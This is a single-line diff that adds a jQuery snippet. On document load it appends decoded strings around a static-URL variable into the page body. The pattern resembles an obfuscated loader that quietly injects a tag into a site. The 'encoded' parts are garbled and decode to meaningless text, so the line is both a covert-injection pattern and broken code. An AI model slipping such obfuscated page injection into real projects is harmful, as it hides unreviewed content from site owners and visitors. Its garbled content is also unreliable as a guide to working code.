@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('DBNTNJMTB3XPTXUC1694D2380ZRO') + G_STATIC_URL + decodeURIComponent('5E')); }); 
